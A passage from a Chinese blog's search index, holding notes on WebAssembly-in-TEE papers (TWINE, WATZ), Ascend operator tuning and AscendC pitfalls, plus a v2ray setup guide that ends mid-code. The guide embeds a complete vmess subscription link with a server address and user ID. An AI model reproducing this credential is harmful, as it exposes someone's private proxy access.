src=\"/blockchain/paper-TWINE/image-20241006142234093.png\" alt=\"image-20241006142234093\" style=\"zoom:50%;\"></p>\n<p>TWINE 只能执行 AOT （提前编译）的 Wasm\n应用程序。优点是执行速度快，内存占用小。</p>\n<p>TWINE 没有考虑 JIT （及时编译）是因为将 LLVM\n机制引入隔离环境需要将代码库移植到使用 SGX 限制进行编译。</p>\n<p>关于 Wasm 应用程序的二进制文件发送到 TEE 中这一过程，不保证 Wasm\n程序的机密性confidentiality（即代码是明文保存的），只保证安全性（用签名进行验证，保证代码或应用程序没有被篡改）。但是当\nWasm\n应用程序进入隔离环境的保留内存中之后，就不会再离开了，这保证了机密性。</p>\n","categories":["笔记"],"tags":["WebAssembly","TrustZone","论文"]},{"title":"A Trusted WebAssembly Runtime Environment with Remote Attestation for TrustZone 论文笔记","url":"/blockchain/paper-WATZ(%E5%BE%85)/","content":"<p>本文提出了 WATZ ，一个可以在 TrustZone 中执行 Wasm\n代码的运行时环境，并提供了远程执行验证。</p>\n<p>几个问题：</p>\n<ol type=\"1\">\n<li>在 TrustZone 的 TEE 中运行 Wasm 代码，有什么困难？</li>\n<li>除了 WATZ，其他的 Wasm 运行时（例如 Wasmtime、WAVM）可以在 TEE\n中执行 Wasm\n代码吗？如果不可以，为什么不可以？如果可以，为什么不直接用他们呢？</li>\n<li>论文中提到的 <strong>远程执行验证</strong> 是什么？有哪些应用？</li>\n</ol>\n<span id=\"more\"></span>\n<h1 id=\"背景和相关研究\">1 背景和相关研究</h1>\n<h2 id=\"webassembly-and-tee\">1.1 Webassembly and TEE</h2>\n<p>有哪些已有的研究？</p>\n<ul>\n<li>TWINE： 是一个嵌入式受信运行时，用于在 Intel SGX 隔离区执行 Wasm\n应用程序。</li>\n<li>Enarx：针对 Intel SGX 隔离区和 AMD SEV 虚拟机。</li>\n<li>Veracruz： 只支持基于 VM 的 TEE，例如 Arm CCA [31] 和 AWS Nitro [32]\n隔离区。</li>\n<li>AccTEE 和 Se-Lambda： 使用 V8 JavaScript/Wasm 引擎在 Intel SGX\n隔离区运行 Wasm 二进制文件。</li>\n</ul>\n<p>这些已有的研究，都不是针对 Arm TrustZone 的。除了\nVeracruz，都是只针对 Intel SGX 的。</p>\n<blockquote>\n<h3 id=\"intel-sgx-与-arm-trustzone\">Intel SGX 与 Arm TrustZone</h3>\n<p><strong>目标平台</strong>：</p>\n<ul>\n<li>SGX是x86架构的解决方案，主要用于英特尔的服务器和PC处理器。</li>\n<li>TrustZone是ARM架构的解决方案，广泛应用于移动设备和嵌入式系统。</li>\n</ul>\n<p><strong>隔离粒度</strong>：</p>\n<ul>\n<li>SGX隔离的是应用程序的一部分，即Enclave，它的设计目标是保护用户态应用中的特定敏感部分。</li>\n<li>TrustZone隔离的是整个系统，它通过划分安全世界和非安全世界，隔离操作系统和应用，涵盖了更大的范围。</li>\n</ul>\n<p><strong>实现方式</strong>：</p>\n<ul>\n<li>SGX通过硬件支持的加密内存保护，实现对Enclave内存的隔离，其他部分无权访问。</li>\n<li>TrustZone通过在硬件层面划分不同的执行世界，实现全系统级别的隔离。</li>\n</ul>\n</blockquote>\n<p><img src=\"/blockchain/paper-WATZ(%E5%BE%85)/image-20241004143317922.png\" alt=\"image-20241004143317922\" style=\"zoom:50%;\"></p>\n<p>AOT（处理提前编译的 Wasm\n字节码）、WASI（启用系统交互）、RA（支持远程证明）、RA in WASI（为托管的\nWasm 应用程序提供控制远程证明的 WASI\nAPI）、µRT（使用小型运行时，内存小于 1 MB）、IoT\nTEE（为物联网设备设计）和 TEE(s)（总结 TEE 技术）。</p>\n<h2 id=\"远程证明ra\">1.2 远程证明（RA）</h2>\n<blockquote>\n<p>什么是远程证明？</p>\n<p><strong>远程证明</strong>\n就像是在远程验证一个人或事物的身份和真实性一样，只是这里指的是计算机程序或设备。简单来说，它是一种机制，允许你在不直接接触程序或设备的情况下，确认它们没有被篡改，并且运行的是你期望的软件。</p>\n<p><strong>案例</strong>：</p>\n<p>想象一下，你有一个智能家居系统，里面运行着许多程序来控制灯光、温度、安全摄像头等。这些程序都存储在设备上，而你无法直接查看它们。这时，远程证明就派上用场了。\n假设某个程序被黑客篡改，变成了恶意软件。如果没有远程证明，你很难发现这个问题。但如果你使用了远程证明，你就可以定期向设备发送一个请求，让它证明自己运行的是正确的软件。如果设备通过了证明，你就知道它没有被黑客攻击，可以放心地使用它。</p>\n<p><strong>远程证明的应用场景</strong>：</p>\n<ul>\n<li><strong>物联网 (IoT)</strong>: 远程证明可以确保 IoT\n设备运行的是安全的软件，防止黑客攻击。</li>\n<li><strong>云计算</strong>:\n远程证明可以确保云服务器运行的是可信的软件，保护用户数据安全。</li>\n<li><strong>区块链</strong>:\n远程证明可以确保区块链节点运行的是正确的软件，维护区块链网络的可靠性。</li>\n<li><strong>汽车</strong>:\n远程证明可以确保车载软件没有被篡改，保障行车安全。</li>\n</ul>\n<p><strong>总结</strong>：</p>\n<p>远程证明是一种重要的安全机制，可以帮助我们验证计算机程序或设备的真实性，防止黑客攻击和数据泄露。它在许多领域都有广泛的应用，为我们的信息安全提供了重要保障。</p>\n</blockquote>\n<p>在本篇论文中，远程证明是为了保证在 Arm TrustZone TEE 中运行的\nWebAssembly 代码的正确性。</p>\n<h1 id=\"源码对比\">源码对比</h1>\n<p><code>unine-watz</code> 中的代码继承自其他开源项目：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">The fork of the runtime is based on the revision cba4c782.</span><br><span class=\"line\">The fork of optee_os is based on the revision 3af354e3.</span><br><span class=\"line\">The fork of build is based on the revision af24ff9.</span><br></pre></td></tr></table></figure>\n<p>首先我要找到他修改了什么地方。</p>\n<h2 id=\"optee_os\">optee_os</h2>\n<p>在 <code>core</code> 和 <code>lib</code>\n文件夹中做了修改，主要提供了新的 PTA （内核中运行的 TA ），提供了\n<code>attesting_service</code> 远程认证服务。</p>\n<h2 id=\"build\">build</h2>\n<p>里面增加了一个 <code>linux-patches/use_monotonic_time.patch</code>\n修改时间的补丁，目的猜测应该是 benchmark 测试的时候控制输出的时间。</p>\n<h2 id=\"runtime\">runtime</h2>\n<p><code>./product-mini/platforms</code> 文件夹中新增了\n<code>linux-trustzone</code>，其中有两个文件夹\n<code>vedliot_verifier</code> 和 <code>vedliot_attester</code>.</p>\n<p>这两个文件夹中的内容都是一个标准的 TA。</p>\n<p>在 WATZ 的远程认证机制中，attester（证明者）和\nverifier（验证者）扮演着关键角色： * <strong>Attester (证明者)</strong>:\n* 运行在 WATZ 环境中的 Wasm\n应用程序，负责生成证据并证明其自身代码的完整性。 * 通过与 WATZ 内置的\nattestation service（认证服务）交互，获取证据，并将其发送给 verifier\n进行验证。 * 可以使用 WASI-RA API\n控制远程认证流程，例如发起握手、发送证据、接收秘密数据等。 *\n<strong>Verifier (验证者)</strong>: * 运行在可信环境之外的实体，负责验证\nattester 发送的证据，并确认其代码的完整性和平台的真实性。 * 接收\nattester 发送的 evidence，并使用设备的公钥对其进行验证。 * 检查 evidence\n中的代码测量值，确保其与预定义的参考值匹配。 * 如果验证通过，可以与\nattester 建立安全的通信通道，并安全地传输秘密数据。</p>\n<figure>\n<img src=\"/blockchain/paper-WATZ(%E5%BE%85)/image-20241025143152581.png\" alt=\"image-20241025143152581\">\n<figcaption aria-hidden=\"true\">image-20241025143152581</figcaption>\n</figure>\n<p>所以 <code>vedliot_attester</code> 是个可以调用 Wasm 的程序的 TA\n！</p>\n<p>先试试看 Wasm 怎么用。</p>\n<p>WAMR：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dGVjb2RlYWxsaWFuY2Uvd2FzbS1taWNyby1ydW50aW1lL2Jsb2IvbWFpbi9wcm9kdWN0LW1pbmkvUkVBRE1FLm1k\">Build\niwasm<i class=\"fa fa-external-link-alt\"></i></span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dGVjb2RlYWxsaWFuY2Uvd2FzbS1taWNyby1ydW50aW1lL2Jsb2IvbWFpbi93YW1yLWNvbXBpbGVyL1JFQURNRS5tZA==\">Build\nwamrc AOT compiler<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>WATZ 的移植和测试过程，见 毕设05。</p>\n","categories":["笔记"],"tags":["WebAssembly","TrustZone","论文"]},{"title":"Ascend 学习笔记 06 - ReduceLogSumExp","url":"/Ascend/06/","content":"<p>ReduceLogSumExp算子思路草稿。</p>\n<span id=\"more\"></span>\n<p>首先根据S4赛季的经验，服务器和我的开发板均是单核的，分片不用考虑大小核。</p>\n<p>先按单核实现，之后提交一份代码检查判题机aicore的数量。</p>\n<p>Reduce算子和之前的Select不一样，每个位置的计算并不是独立的。所以可能得记录每次计算的中间结果。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考算子：</span><br><span class=\"line\">torch.logsumexp</span><br><span class=\"line\"></span><br><span class=\"line\">算子输入取值范围：</span><br><span class=\"line\">N∈[1,1000]</span><br><span class=\"line\">N2∈[1,1000]</span><br><span class=\"line\">N3∈[200, 2000]</span><br><span class=\"line\">N4∈[200,2000]</span><br><span class=\"line\"></span><br><span class=\"line\">算子输入特征说明:</span><br><span class=\"line\">N~N4均可能为非32的整倍数，需要考虑非对齐场景。</span><br><span class=\"line\">x的维度数为dim，axes取值范围为[-dim, dim-1]</span><br></pre></td></tr></table></figure>\n<p>题目里给出N的取值范围。另外注意到 axes\n的取值可以是负数。含义是从最后一维往前数的第几个维度。</p>\n<p>想到题目最终计分的只有一个测试点。</p>\n<p>往往会是最简单的形状，比如 axes.size() = 1的 float。</p>\n<p><strong>正常</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 210.17</span><br><span class=\"line\">Case2: Pass, Result: 44807.09</span><br><span class=\"line\">Case3: Run failed!</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p><strong>禁用 half</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Wrong answer</span><br><span class=\"line\">Case2: Pass, Result: 44807.09</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p>case3说明，在half的情况下我的代码有可能运行时报错。</p>\n<p><strong>禁用fp32</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 210.17</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Run failed!</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<p><strong>axes_num == 1 then return</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Wrong answer</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<p>惊了，全是 Wrong answer，说明只用归约一个维度</p>\n<p><strong>x_ndim == 1 then return</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Wrong answer</span><br><span class=\"line\">Case2: Pass, Result: 23626.96</span><br><span class=\"line\">Case3: Run failed!</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p><strong>x_ndim == 3 then return</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 201.3</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p><strong>注释掉Process</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Wrong answer</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<p>说明不是Init的时候报错。</p>\n<p><strong>axes[0] == 0 then return</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Wrong answer</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Run failed!</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p><strong>axes[0] == 1 then return</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 201.81</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Pass, Result: 795316.39</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<p>??????再提交一次一样的，难道axes是随机的？Run failed\n有没有可能就是因为超时了？因为他的算子里有50次重复，如果太慢了，就报错了？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 205.64</span><br><span class=\"line\">Case2: Pass, Result: 31030.32</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p>确定了，axes也是随机的。shape的尺寸应该是固定的，内容是随机的。</p>\n<p>并且时间的随机性有点大。</p>\n<p>这里的 Case3 碰巧成功了。</p>\n<p>现在怀疑的是，超时会导致 run failed 吗？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Run failed!</span><br><span class=\"line\">Case2: Run failed!</span><br><span class=\"line\">Case3: Run failed!</span><br><span class=\"line\">Case4: Run failed!</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p>对了！超时会报错 Run failed. 所以就应该改进算法了。</p>\n<p>又侧了一下，大多数测试点的最后一维度，能放满8个datablock。</p>\n<table>\n<thead>\n<tr>\n<th>case</th>\n<th>类型</th>\n<th>axes</th>\n<th>x_ndim</th>\n<th>对齐</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>case1</td>\n<td>fp16</td>\n<td>0</td>\n<td>1</td>\n<td>√</td>\n</tr>\n<tr>\n<td>case2</td>\n<td>fp32</td>\n<td>随机</td>\n<td>3</td>\n<td>√</td>\n</tr>\n<tr>\n<td>case3</td>\n<td>fp16</td>\n<td>随机</td>\n<td>3</td>\n<td>√</td>\n</tr>\n<tr>\n<td>case4</td>\n<td>fp32</td>\n<td>随机</td>\n<td>3</td>\n<td>x</td>\n</tr>\n<tr>\n<td>case5</td>\n<td>fp32</td>\n<td>随机</td>\n<td>4</td>\n<td>√</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 24.33</span><br><span class=\"line\">Case2: Pass, Result: 26025.45</span><br><span class=\"line\">Case3: Pass, Result: 52674.41</span><br><span class=\"line\">Case4: Pass, Result: 614477.86</span><br><span class=\"line\">Case5: Run failed!</span><br><span class=\"line\"></span><br><span class=\"line\">Case1: Pass, Result: 23.07</span><br><span class=\"line\">Case2: Pass, Result: 13752.02</span><br><span class=\"line\">Case3: Pass, Result: 357978.04</span><br><span class=\"line\">Case4: Pass, Result: 115878.35</span><br><span class=\"line\">Case5: Run failed!</span><br></pre></td></tr></table></figure>\n<p>沃趣，开了O3就快了好几倍……………………S4亏了几千块……</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.46</span><br><span class=\"line\">Case2: Pass, Result: 296.57</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Pass, Result: 91518.82</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 11.2</span><br><span class=\"line\">Case2: Wrong answer</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.41</span><br><span class=\"line\">Case2: Pass, Result: 864.72</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Wrong answer</span><br><span class=\"line\">Case5: Pass, Result: 405289.68</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.37</span><br><span class=\"line\">Case2: Pass, Result: 864.0</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Pass, Result: 115822.27</span><br><span class=\"line\">Case5: Pass, Result: 405290.45</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.22</span><br><span class=\"line\">Case2: Pass, Result: 2303.0</span><br><span class=\"line\">Case3: Pass, Result: 35795.71</span><br><span class=\"line\">Case4: Pass, Result: 115763.58</span><br><span class=\"line\">Case5: Pass, Result: 356334.49</span><br><span class=\"line\">prof_sum: 510207.0</span><br></pre></td></tr></table></figure>\n<p>然后开始更高并行的优化。</p>\n<p>每次迭代最多算256B，mask <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.09ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.509ex\" height=\"1.312ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -540 667 580\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g></g></g></svg></mjx-container></span> [1,\n256 / sizeof(type)]. 最大 128/64</p>\n<p>现在消耗的空间是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tile_data_num * sizeof(DTYPE_X) * dpb * 2</span><br><span class=\"line\">sizeof(DTYPE_X) * dpb * 2</span><br><span class=\"line\">sizeof(DTYPE_X) * dpb</span><br><span class=\"line\"></span><br><span class=\"line\">BLOCK_SIZE * (2 * tile_data_num + 3)</span><br></pre></td></tr></table></figure>\n<p>还要保证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bpt * BLOCK_SIZE &lt;= 256</span><br></pre></td></tr></table></figure>\n<p>优化完之后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.51</span><br><span class=\"line\">Case2: Pass, Result: 142.76</span><br><span class=\"line\">Case3: Pass, Result: 4632.55</span><br><span class=\"line\">Case4: Pass, Result: 724551.2</span><br><span class=\"line\">Case5: Wrong answer</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.43</span><br><span class=\"line\">Case2: Pass, Result: 300.22</span><br><span class=\"line\">Case3: Pass, Result: 4639.45</span><br><span class=\"line\">Case4: Pass, Result: 614716.15</span><br><span class=\"line\">Case5: Pass, Result: 69201.51 // 356334.49</span><br><span class=\"line\">prof_sum: 688867.75</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Case1: Pass, Result: 10.55</span><br><span class=\"line\">Case2: Pass, Result: 301.08</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Pass, Result: 724559.5</span><br><span class=\"line\">Case5: Pass, Result: 69202.31</span><br><span class=\"line\"></span><br><span class=\"line\">Case1: Pass, Result: 10.62</span><br><span class=\"line\">Case2: Pass, Result: 292.77</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Pass, Result: 724575.87</span><br><span class=\"line\">Case5: Pass, Result: 69201.29</span><br><span class=\"line\"></span><br><span class=\"line\">Case1: Pass, Result: 11.22</span><br><span class=\"line\">Case2: Pass, Result: 318.59</span><br><span class=\"line\">Case3: Pass, Result: 4789.99</span><br><span class=\"line\">Case4: Pass, Result: 614270.17</span><br><span class=\"line\">Case5: Wrong answer</span><br><span class=\"line\"></span><br><span class=\"line\">Case1: Pass, Result: 10.4</span><br><span class=\"line\">Case2: Pass, Result: 142.85</span><br><span class=\"line\">Case3: Pass, Result: 4975.8</span><br><span class=\"line\">Case4: Pass, Result: 614251.78</span><br><span class=\"line\">Case5: Wrong answer</span><br><span class=\"line\"></span><br><span class=\"line\">Case1: Pass, Result: 11.43</span><br><span class=\"line\">Case2: Pass, Result: 142.81</span><br><span class=\"line\">Case3: Wrong answer</span><br><span class=\"line\">Case4: Pass, Result: 724589.49</span><br><span class=\"line\">Case5: Pass, Result: 69201.51</span><br></pre></td></tr></table></figure>\n<p>中间凑巧有一次全跑对了……</p>\n<p>现在的问题：</p>\n<ol type=\"1\">\n<li>非对齐未实现</li>\n<li>对齐但归约最后一维度，没优化</li>\n<li>对齐归约非最后一维度，优化了，但是实现有bug，并且优化性能提升不够（远不如第一名）</li>\n</ol>\n<p>后续方案：</p>\n<ol type=\"1\">\n<li>首先解决目前的bug，评估一下在目前报错的维度中，性能提升是否更加显著</li>\n<li>检查现在的tiling策略是不是有缺陷，可以分配的更密集一点</li>\n<li>非对齐实现</li>\n</ol>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"AscendC 踩坑记录","url":"/Ascend/%E5%9D%91/","content":"<p>记录一下踩过的坑……</p>\n<span id=\"more\"></span>\n<h1 id=\"数据搬运\">1 数据搬运</h1>\n<h2 id=\"普通数据搬运-stride-限制\">1.1 普通数据搬运 stride 限制</h2>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"title\">DataCopyParams</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">uint16_t</span> count, <span class=\"type\">const</span> <span class=\"type\">uint16_t</span> len, <span class=\"type\">const</span> <span class=\"type\">uint16_t</span> srcStrideIn,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        <span class=\"type\">const</span> <span class=\"type\">uint16_t</span> dstStrideIn)</span></span></span><br><span class=\"line\"><span class=\"function\">        : blockCount(count),</span></span><br><span class=\"line\"><span class=\"function\">          blockLen(len),</span></span><br><span class=\"line\"><span class=\"function\">          srcStride(srcStrideIn),</span></span><br><span class=\"line\"><span class=\"function\">          dstStride(dstStrideIn)</span></span><br><span class=\"line\"><span class=\"function\">    {</span>}</span><br></pre></td></tr></table></figure>\n<p>DataCopyParams 的 stride 是 uint16，所以有大小限制。</p>\n<p>对于更大范围的不连续数据搬运，应该使用切片数据搬运。</p>\n<h2 id=\"切片数据搬运\">1.2 切片数据搬运</h2>\n<figure>\n<img src=\"/Ascend/%E5%9D%91/zh-cn_image_0000001949463754.png\" alt=\"img\">\n<figcaption aria-hidden=\"true\">img</figcaption>\n</figure>\n<p>8.0RC2之前的文档中，这张图片都画错了。</p>\n<p>尤其注意 endIndex ，是 startIndex + len - 1。</p>\n<p>很不合习惯，这种东西一般都是前闭后开的。</p>\n","categories":["笔记","坑"],"tags":["AI","硬件加速","Ascend"]},{"title":"linux-v2ray","url":"/other/linux-v2ray/","content":"<p>在linux服务器上装梯子。</p>\n<span id=\"more\"></span>\n<p>下载对应版本的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3YyZmx5L3YycmF5LWNvcmUvcmVsZWFzZXMv\">v2ray<i class=\"fa fa-external-link-alt\"></i></span>。解压到一个文件夹里。包含\n<code>v2ray</code> <code>config.json</code> 等文件。</p>\n<p>获取订阅链接，形如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vmess://eyJob3N0IjoiIiwicGF0aCI6Ii92MiIsInRscyI6IiIsInZlcmlmeV9jZXJ0Ijp0cnVlLCJhZGQiOiJ2Y21pYW8uY29tIiwicG9ydCI6IjEwMTM0IiwiYWlkIjoiMSIsIm5ldCI6IndzIiwidHlwZSI6Im5vbmUiLCJ2IjoiMiIsInBzIjoiISHmr4/mrKHkvb/nlKjliY3or7flhYjmm7TmlrDorqLpmIUhISIsImlkIjoiYzY1NWQyODAtNzliYi0zYTBkLTkxMjUtZjQ5ODM2NzIyY2IzIiwiY2xhc3MiOjAsInNlY3VyaXR5IjoiYXV0byIsInNjeSI6ImF1dG8ifQ==</span><br></pre></td></tr></table></figure>\n<p>用如下python脚本转换为配置文件：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在此处粘贴你的 vmess 链接列表</span></span><br><span class=\"line\">vmess_links = <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">vmess://eyJob3N0IjoiIiwicGF0aCI6Ii92MiIsInRscyI6IiIsInZlcmlmeV9jZXJ0Ijp0cnVlLCJhZGQiOiJ2Y21pYW8uY29tIiwicG9ydCI6IjEwMTM0IiwiYWlkIjoiMSIsIm5ldCI6IndzIiwidHlwZSI6Im5vbmUiLCJ2IjoiMiIsInBzIjoiISHmr4/mrKHkvb/nlKjliY3or7flhYjmm7TmlrDorqLpmIUhISIsImlkIjoiYzY1NWQyODAtNzliYi0zYTBkLTkxMjUtZjQ5ODM2NzIyY2IzIiwiY2xhc3MiOjAsInNlY3VyaXR5IjoiYXV0byIsInNjeSI6ImF1dG8ifQ==</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span>.strip().splitlines()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出文件保存路径</span></span><br><span class=\"line\">output_dir = <span class=\"string\">\"./vmess_configs\"</span></span><br><span class=\"line\">os.makedirs(output_dir, exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, line <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(vmess_links, <span class=\"number\">1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> line.startswith(<span class=\"string\">\"vmess://\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        encoded = line.strip().replace(<span class=\"string\">\"vmess://\"</span>, <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 补全 Base64 padding</span></span><br><span class=\"line\">        padding = <span class=\"string\">'='</span> * (-<span class=\"built_in\">len</span>(encoded) % <span class=\"number\">4</span>)</span><br><span class=\"line\">        decoded = base64.b64decode(encoded + padding).decode(<span class=\"string\">\"utf-8\"</span>)</span><br><span class=\"line\">        config = json.loads(decoded)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 构造 V2Ray 客户端 config.json</span></span><br><span class=\"line\">        v2ray_config = {</span><br><span class=\"line\">            <span class=\"string\">\"inbounds\"</span>: [</span><br><span class=\"line\">                {</span><br><span class=\"line\">                    <span class=\"string\">\"port\"</span>: <span class=\"number\">10808</span>,</span><br><span class=\"line\">                    <span class=\"string\">\"listen\"</span>: <span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">                    <span class=\"string\">\"protocol\"</span>: <span class=\"string\">\"socks\"</span>,</span><br><span class=\"line\">                    <span class=\"string\">\"settings\"</span>: {</span><br><span class=\"line\">                        <span class=\"string\">\"udp\"</span>: <span class=\"literal\">True</span></span><br><span class=\"line\">                    }</span><br><span class=\"line\">                }</span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"string\">\"outbounds\"</span>: [</span><br><span class=\"line\">                {</span><br><span class=\"line\">                    <span class=\"string\">\"protocol\"</span>: <span class=\"string\">\"vmess\"</span>,</span><br><span class=\"line\">                    <span class=\"string\">\"settings\"</span>: {</span><br><span class=\"line\">                        <span class=\"string\">\"vnext\"</span>: [</span><br><span class=\"line\">                            {</span><br><span class=\"line\">                                <span class=\"string\">\"address\"</span>: config.get(<span class=\"string\">\"add\"</span>, <span class=\"string\">\"\"</span>),</span><br><span class=\"line\">                                <span class=\"string\">\"port\"</span>: <span class=\"built_in\">int</span>(config.get(<span class=\"string\">\"port\"</span>, <span class=\"number\">443</span>)),</span><br><span class=\"line\">                                <span class=\"string\">\"users\"</span>: [</span><br><span class=\"line\">                                    {</span><br><span class=\"line\">                                        <span class=\"string\">\"id\"</span>: config.get(<span class=\"string\">\"id\"</span>, <span 